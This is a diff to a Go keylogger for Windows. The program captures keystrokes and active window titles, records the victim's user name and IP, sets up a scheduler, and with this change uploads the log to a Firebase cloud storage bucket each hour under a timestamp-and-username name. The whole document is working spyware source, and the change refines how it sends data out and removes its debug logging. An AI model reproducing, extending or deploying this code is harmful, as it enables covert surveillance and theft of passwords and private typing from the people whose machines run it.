@@ -5,6 +5,7 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"context"
 	"encoding/json"
@@ -26,6 +27,9 @@ import (
 )
 
 const (
+	timeSaveMinutesInterval = 60
+	timeLayout              = "2006-01-02 15:04:05 -0700"
+
 	destinationFile = ""
 	storageBucket   = ""
 
@@ -95,7 +99,7 @@ type googleCredentials struct {
 }
 
 func (si *systemInfo) String() string {
-	return time.Now().Format("2006-01-02 15:04:05") + " " + "(log " + si.userName + " " + si.userUsername + " " + si.localIP.String() + ")" + "\r\n"
+	return time.Now().Format(timeLayout) + "\r\n" + "(log " + si.userName + " " + si.userUsername + " " + si.localIP.String() + ")" + "\r\n"
 }
 
 // User32.dll
@@ -217,6 +221,7 @@ func getSystemDirectory(lpBuffer *byte) (len int32, err error) {
 
 func fileInterval() {
 	writeTicker := time.NewTicker(10 * time.Second)
+	saveTicker := time.NewTicker(1 * time.Minute)
 
 	go func() {
 		for {
@@ -224,6 +229,12 @@ func fileInterval() {
 			case <-writeTicker.C:
 				writeLogFile(eventsBuf)
 				eventsBuf = ""
+			case <-saveTicker.C:
+				diff, time := getFileDateDiff()
+				if diff.Minutes() > timeSaveMinutesInterval {
+					writeToBucket(time.Format(timeLayout) + "--" + systemInfoData.userUsername)
+					createLogFile(true)
+				}
 			}
 		}
 	}()
@@ -246,19 +257,45 @@ func writeLogFile(data string) {
 	}
 }
 
-func createLogFile() {
+func createLogFile(force bool) {
 	cwd, GetwdErr := os.Getwd()
 	if GetwdErr != nil {
 		log.Panicf("cwd -> %v", GetwdErr)
 	}
-	log.Printf("create -> %v", cwd+"\\"+destinationFile)
-	file, createErr := os.Create(cwd + "\\" + destinationFile)
-	if createErr != nil {
-		log.Panicf("createLogFile -> %v", createErr)
+
+	if _, stateErr := os.Stat(cwd + "\\" + destinationFile); os.IsNotExist(stateErr) || force {
+		log.Printf("create -> %v", cwd+"\\"+destinationFile)
+		file, createErr := os.Create(cwd + "\\" + destinationFile)
+		if createErr != nil {
+			log.Panicf("createLogFile -> %v", createErr)
+		}
+
+		defer file.Close()
+		file.WriteString(systemInfoData.String())
+	}
+}
+
+func getFileDateDiff() (time.Duration, time.Time) {
+	cwd, GetwdErr := os.Getwd()
+	if GetwdErr != nil {
+		log.Panicf("cwd -> %v", GetwdErr)
 	}
 
+	file, openErr := os.Open(cwd + "\\" + destinationFile)
+	if openErr != nil {
+		log.Panicf("open -> %v", openErr)
+	}
 	defer file.Close()
-	file.WriteString(systemInfoData.String())
+
+	scanner := bufio.NewScanner(file)
+	scanner.Split(bufio.ScanLines)
+	scanner.Scan()
+
+	parsedTime, parseErr := time.Parse(timeLayout, scanner.Text())
+	if parseErr != nil {
+		log.Panicf("parse -> %v", parseErr)
+	}
+	return time.Since(parsedTime), parsedTime
 }
 
 func getOutboundIP() net.IP {
@@ -304,7 +341,7 @@ func windowLogger() {
 
 		if syscall.UTF16ToString(window) != "" && tmpTitle != syscall.UTF16ToString(window) {
 			tmpTitle = syscall.UTF16ToString(window)
-			tmpWindow <- string("(" + time.Now().Format("2006-01-02 15:04:05") + ")" + "[" + syscall.UTF16ToString(window) + "]\r\n")
+			tmpWindow <- string("(" + time.Now().Format(timeLayout) + ")" + "[" + syscall.UTF16ToString(window) + "]\r\n")
 		}
 		time.Sleep(1 * time.Millisecond)
 	}
@@ -543,8 +580,8 @@ func initFirebase() {
 	bucketHandler = bucket
 }
 
-func writeToBucket() {
-	objWriter := bucketHandler.Object("test.txt").NewWriter(context.Background())
+func writeToBucket(name string) {
+	objWriter := bucketHandler.Object(name).NewWriter(context.Background())
 	defer objWriter.Close()
 
 	cwd, GetwdErr := os.Getwd()
@@ -564,23 +601,11 @@ func writeToBucket() {
 
 func main() {
 	log.Println("Starting...")
-	cwd, GetwdErr := os.Getwd()
-	if GetwdErr != nil {
-		log.Panicf("cwd -> %v", GetwdErr)
-	}
-	f, err := os.OpenFile(cwd+"\\"+"debug.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0777)
-	if err != nil {
-		log.Panicf("OpenFile -> %v", err)
-	}
-	defer f.Close()
-	log.SetOutput(f)
-	log.Printf("log -> %v", cwd+"\\"+"debug.log")
 	getSystemInfo()
-	createLogFile()
+	createLogFile(false)
 	addScheduler()
 	initFirebase()
-	writeToBucket()
-	go fileInterval()
+	fileInterval()
 	go keyLogger()
 	go windowLogger()
 	go keyLoggerListener()
